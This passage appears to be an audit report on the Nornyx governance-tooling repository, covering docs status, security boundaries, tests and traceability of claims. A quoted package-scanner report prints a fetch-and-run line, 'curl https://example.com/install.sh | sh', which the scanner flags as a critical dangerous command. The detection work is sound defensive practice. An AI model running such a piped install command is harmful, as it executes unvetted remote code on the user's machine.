| `docs/04_AI_ENGINEERING_REQUIREMENTS_MATRIX.md` (23) | Requirement × primitive matrix with per-row v0.1 status: Yes (intent, context, agent, skill, policy, eval, harness, evidence, approval, trace, budget), **Planned** (guardrail, memory, connector, incident_response, containment, supply_chain), **Experimental** (healing, improvement_loop). | Mixed — the status column is the normative part; "v1.0 target" column is aspirational |
| `docs/06_CONTEXT_ENGINEERING.md` (74) | "Context is not a prompt blob. It is a governed artifact." Ten context dimensions; v0.2 context-pack contents (hashes, provenance URI, trust level, taint, authority rank, may-define-policy flag). | Normative for the implemented context pack; dimension list partly aspirational |
| `docs/07_HARNESS_ENGINEERING.md` (94) | Harness responsibilities (load context → enforce policy → run tools/tests/evals → approval → evidence) with YAML example. | Largely aspirational design (harness_runtime emits plans/reports, not tool execution) |
| `docs/08_EVALS_AND_GUARDRAILS.md` (71) | Tests vs evals vs guardrails distinction; eval metric examples; guardrail example labeled "**Future** guardrail example". | Mixed; guardrails explicitly future (matrix: "Planned") |
| `docs/10_EXTENSION_PROTOCOLS_MCP_A2A.md` (98) | "Nornyx **should** integrate" with MCP/A2A as governed connectors with capability manifests, deny lists, approval requirements. | Aspirational ("should" language; connectors "Planned" in matrix; agentic-network profile validates static declarations only per GOVERNANCE_CLI_AND_API) |
| `docs/11_OBSERVABILITY_EVIDENCE.md` (63) | Trace-event taxonomy and evidence-pack contents (patch.diff, test/eval/security reports, approval log). | Mostly aspirational ("should"); evidence-pack scaffolding is implemented via `evidence.py`/CLI `evidence-pack` |
| `docs/13_RISK_REGISTER.md` (15) | 12-row risk table: overreach as GP language (High), weak policy enforcement (High), unsafe connector execution (High), context poisoning (High), self-improvement regression (High), eval gaming, name legal conflict ("Formal trademark clearance before public launch", Medium). | Normative self-assessment |
| `docs/14_REFERENCES.md` (30) | Source map: MCP spec, A2A, OpenTelemetry GenAI semconv, OWASP LLM Top 10, NIST AI RMF, ANPL, AlphaEvolve. Design note: "Nornyx should not copy these systems." | Reference list; verify links before formal citation (its own caveat) |

---

## 7. Architecture Governance Profile — IMPLEMENTED

- Built-in governance profile `architecture_governance` (`nornyx/profiles_data/architecture_governance.yaml`, id `nornyx.builtin.architecture_governance`) plus module `module_architecture_conformance.yaml`; implementation in `nornyx/governance/architecture.py`; schemas `schemas/architecture_v1.schema.json`, `architecture_evidence_v1.schema.json`, `architecture_report_v1.schema.json`; tests `tests/test_architecture_governance.py` (9 tests); decision record ADR-0030.
- Boundary (ADR-0030 + schema description): Nornyx owns `nornyx.architecture_report.v1`, "a bounded envelope emitted by CI adapters for architecture tools; Nornyx imports this file **without executing the named tool**." Required fields: schema const, check_id, tool, tool_version, status (pass/fail/error), subject_revision, generated_at, expires_at, violations.
- Example set: `examples/architecture_governance.nyx` (a v0.2 contract with an `ArchitectureAuthority` approval denying `ai_tool`/`execution_surface`/`autonomous_agent`/`model`/`connector`/`generated_output` actor types, revision binding `kind: git … exact: true`, and hash-bound `governance_evidence` records); `examples/architecture_artifacts/` (ADR-ARCH-EXAMPLE.md, governance-api.md, overview.md); `examples/architecture_reports/dependency_boundaries.json` (a real envelope: tool `dependency-cruiser` 16.10.4, status pass, zero violations).

---

## 8. Licensing, Security, Conduct

- `LICENSE`: MIT, "Copyright (c) 2026 Mazin Marji and Nornyx Contributors."
- `SECURITY.md`: v0.1 safety boundaries — no arbitrary shell execution, no live LLM calls, no live MCP/A2A execution, no production deployment, no credential storage, no self-modifying code, no external network calls; 7 security principles ("Untrusted context may inform an agent, but must never define policy or authority"; "Self-healing and self-improvement are proposal-and-gate workflows").
- `CONTRIBUTING.md`: keep v0.1 small/interoperable; "Do not add destructive command execution to the default runtime"; tests for every checker/generator behavior; docs before new language blocks.
- `CODE_OF_CONDUCT.md`: 3 lines — respectful, precise, security-conscious collaboration.
- **Trademark/naming disclaimer**: no standalone trademark or non-affiliation disclaimer exists in README or docs; the only mention is the risk-register row "Name legal conflict | Medium | Formal trademark clearance before public launch" (`docs/13_RISK_REGISTER.md:15`). The book must not claim a formal disclaimer exists.
- `docs/public-boundary-policy.md` (18 lines): public repo content must not contain private downstream platform/product/customer names or secrets; enforced by `scripts/check-public-boundary.py` in CI (`quality` job) and `tests/test_public_boundary.py`.

---

## 9. Test Suite Overview — IMPLEMENTED

- `tests/`: 88 entries (86 `test_*.py` files + `fixtures/` + `symlink_support.py`); **~1,046 test functions** (grep count of `def test`), run with `python -m pytest -q` (Makefile `test`; CI matrix 3.10–3.13 Linux + 3.13 Windows).
- Deepest coverage by test-function count: `test_agentic_authz.py` (114), `test_agentic_network_governance.py` (63), `test_governance_audit_path_and_lock_security.py` (49), `test_crewai_governance_benchmark.py` (47), `test_governance_runtime.py` (43), `test_governance_audit_approval_integrity.py` (35), `test_agentic_network_delegation.py` (35), `test_governed_package_profile.py` (34). Interpretation: the agentic authorization SPI, agentic-network governance, path/lock security, approval integrity, and the governed-package profile are the most heavily assured subsystems.
- Notable meta-tests: documentation/version consistency (`test_documentation_consistency.py`, `test_manifest_metadata.py`, `test_readme_commands.py`), release policy (`test_release_workflow_policy.py`), no-network wheel guard (`test_wheel_network_guard.py`), symlink hardening (`test_symlink_support.py`, `test_governance_audit_cross_platform.py`), governance compatibility corpus (`test_governance_compatibility_corpus.py`, `test_legacy_governance_shim.py`).
- Additional suite: `adapters/nornyx-agentic-adapters/tests/` runs separately in the `adapter-*` CI jobs against a same-commit core wheel.

---

## 10. Textbook-Quotable Excerpts

**(a) Package scan report fragment** — produced live during this audit by `python -m nornyx.cli package scan examples/governed_package/suspicious_setup_script --out <dir>` (generator: `nornyx/package_scanner.py:987-997`):

```markdown
# Risk Surface Report

- Risk tier: `critical`
- Risk score: `16`
- high: 4
- critical: 1

## Explanations

- setup/install/lifecycle scripts detected: 1 finding(s)
- dangerous commands detected: 1 finding(s)
```
and from `command_risk_report.md`: `` - `curl_pipe_sh` in `install.sh` line 2: curl https://example.com/install.sh | sh `` — CLI summary printed `"package_payload_executed": false` alongside `"risk_tier": "critical"`.

**(b) Workspace manifest** — `docs/USE_IN_YOUR_REPO.md:101-111` (same shape as `tests/test_workspace.py:9-19`): see §2.3 above.

**(c) CI drift-gate fragment** — `docs/USE_IN_YOUR_REPO.md:86` recommends the one-line gate `- run: nornyx drift nornyx.nyx --out .nornyx   # fails the build on any drift`; the repo's own executed drift gate is step 5 of `scripts/agentic_network_ci.py` ("regenerate and byte-compare (generated-artifact drift gate)", `docs/agentic-network/11_REFERENCE_CI.md:20`); and the release fail-closed gate: `.github/workflows/release.yml:711-719` — tag must match `^v[0-9]+\.[0-9]+\.[0-9]+$` or `eligible=false`.

**(d) ADR excerpt** — `docs/decisions/ADR-0040-governance-assurance-tiers.md`: "The word 'guarantee' is deliberately avoided: Tier 1 does not guarantee runtime behavior, and Tier 3 is not delivered by Nornyx alone. These are **assurance tiers with claim boundaries**, not product guarantees." And its three boundary facts: declarative controls are design-time; adapter enforcement is cooperative ("bypassing the adapter bypasses the hook"); independent runtime assurance is not supplied by Nornyx alone.

---

## 11. Traceability Rows

| Claim | Evidence path | Status |
|---|---|---|
| `nornyx package scan` is deterministic, local, no-network, never executes payloads | `nornyx/package_scanner.py:1153-1159, 1192-1198`; `docs/governed-package-profile.md:85-88` | IMPLEMENTED |
| Scanner detects hooks, MCP, secrets, endpoints, dangerous commands, scripts, claim mismatches | `nornyx/package_scanner.py:33-116, 489-728, 1017-1024` | IMPLEMENTED |
| Secret values are always redacted (`REDACTED_SECRET_LIKE_VALUE`, `raw_secret_stored: false`) | `nornyx/package_scanner.py:234-241, 376-419, 1195` | IMPLEMENTED |
| Exactly two evidence importers: syft, gitleaks | `nornyx/cli.py:305`; `nornyx/package_scanner.py:817-820` | IMPLEMENTED |
| External adapters are import-only; Nornyx never executes external tools | `nornyx/package_scanner.py:901-904` | IMPLEMENTED |
| Unsafe installation/safety flags fail validation (inert-by-default) | `docs/governed-package-profile.md:59-81, 280-303`; `examples/governed_package/invalid_unsafe_flags.nyx`; `tests/test_governed_package_profile.py` | IMPLEMENTED |
| Nornyx must not claim a package is safe | `docs/governed-package-profile.md:38, 146-148`; `nornyx/package_scanner.py:983` | NON-GOAL (explicit) |
| Radar is advisory-only (`proposal_only: true`) | `nornyx/governed_package.py:1638, 1670-1673` | IMPLEMENTED |
| `workspace-check` verifies member policies match canonical rules; `--write` syncs surgically | `nornyx/workspace.py:218-299, 99-215`; `tests/test_workspace.py` (15 tests) | IMPLEMENTED |
| Workspace layer exists because both repos' own gates gave a false green | `docs/CASE_STUDY_multi_repo_governance.md:28-45` | IMPLEMENTED (post-incident) |
| No cross-repo `policy-ref` language feature (deliberate) | `docs/CASE_STUDY_multi_repo_governance.md:58-61` | NON-GOAL |
| `nornyx drift` compares every generated artifact by hash | `nornyx/repo_drift.py:1-9, 30-40`; `tests/test_repo_drift.py` | IMPLEMENTED |
| PyPI publishing uses Trusted Publishing (OIDC), no stored token, tag-format fail-closed gate | `.github/workflows/release.yml:672-736`; `RELEASING.md:2-6` | IMPLEMENTED |
| Adapter releases bind tag version to package version at the tagged commit, fail closed | `.github/workflows/adapters-release.yml:4-13, 71-87` | IMPLEMENTED |
| Seven equality-enforced version locations, test-enforced | `RELEASING.md:10-24`; `tests/test_documentation_consistency.py` et al. | IMPLEMENTED |
| CI fails closed on skipped framework tests and forbids network in wheel smoke | `.github/workflows/ci.yml:263-275, 300-358`; `tests/test_wheel_network_guard.py` | IMPLEMENTED |
| Repo has no root `.nyx` self-contract; self-governance is via CI example checks + consistency tests | filesystem search; `.github/workflows/ci.yml:167-168`; `scripts/agent/run-nornyx-validation-gates.sh` | IMPLEMENTED (indirect) |
| `nornyx governance analyze` does not exist | `docs/GOVERNANCE_CLI_AND_API.md:10-11`; ADR-0031 | NON-GOAL |
| Governance inspection surface is local, read-only, data-only | `docs/GOVERNANCE_CLI_AND_API.md:3-11` | IMPLEMENTED |
| Public Python API = `nornyx.governance.__all__` + 6 top-level names; 2-minor-release/6-month deprecation policy | `docs/GOVERNANCE_CLI_AND_API.md:66-92`; `nornyx/__init__.py` | IMPLEMENTED (policy documented) |
| "Runtime"-named modules do not make Nornyx an execution engine | `docs/02_ARCHITECTURE.md:16-19` + module docstrings (§5) | NON-GOAL (documented boundary) |
| Guardrails, memory, connectors, incident response, containment, supply chain: Planned | `docs/04_AI_ENGINEERING_REQUIREMENTS_MATRIX.md` | ROADMAP |
| Self-healing / improvement loops: experimental, proposal-and-gate only | matrix; `examples/self_healing.nyx`; `SECURITY.md` principle 5 | ROADMAP/Experimental |
| Architecture profile imports tool reports without executing tools | `schemas/architecture_report_v1.schema.json` (description); ADR-0030; `tests/test_architecture_governance.py` | IMPLEMENTED |
| Assurance tiers forbid overclaiming ("not product guarantees") | `docs/decisions/ADR-0040-governance-assurance-tiers.md` | GUIDANCE (ADR marked "Proposed (design only)") |
| MIT license, 2026, Mazin Marji and Nornyx Contributors | `LICENSE` | IMPLEMENTED |
| ~1,046 test functions across 86 test files | `tests/` grep count | IMPLEMENTED (approximate) |

---

## 12. Unverified or Ambiguous

1. **ADR numbering collision**: `docs/ADRs/ADR-0021-zero-friction-adoption-ramp.md` vs `docs/decisions/ADR-0021-change-governance-as-a-module.md` share the number 0021 with different subjects, and ADR series live in two directories (`docs/ADRs/` for 0001+0021, `docs/decisions/` for 0010–0042). The book should cite full paths, not bare ADR numbers.
2. **No trademark/naming disclaimer exists** — only a risk-register row planning "formal trademark clearance before public launch." Do not state that clearance happened; unverified.
3. **Radar confidence scores (0.74 / 0.2)** are hardcoded constants (`governed_package.py:1669, 1689`), not computed metrics — the book should not describe them as a calibrated confidence model.
4. **PyPI-side state** (trusted-publisher registrations for `nornyx` and `nornyx-agentic-adapters`, whether the `pypi` environment has a required reviewer) is an out-of-repo operational fact; `RELEASING.md:71-81` says configured, `adapters-release.yml:14-20` says the adapters registration is a prerequisite that may not yet exist. Unverifiable from the repo.
5. **`manifest.json` roadmap note**: "package publication and GOAL-100 remain approval-gated" — GOAL-100 is not among `docs/goals/` files (which stop at goal-063); status of GOAL-100 is unresolved planning language.
6. **CODEX_GOAL.md final verdict**: the file mandates a verdict but the current recorded program state is spread across `docs/planning/` and `docs/pmo/status/current_status.json`; whether the program was formally closed with `PROGRAM COMPLETE` was not verified line-by-line (the 1,326-line file was skimmed per instruction, classified as internal planning).
7. **`nornyx drift` is not run against the Nornyx repo itself in CI** — the byte-compare drift gate that CI *does* run applies to the agentic-network example via `scripts/agentic_network_ci.py`. If the book says "Nornyx dogfoods its drift gate," it must scope the claim this way.
8. **Test-function count (~1,046)** is a `def test` grep, including parametrized bases but not expansion; treat as approximate.
9. **Docs numbering gaps** (e.g. no 20, 21, 26, 62 in `docs/`): assumed intentional/historical; not investigated further.
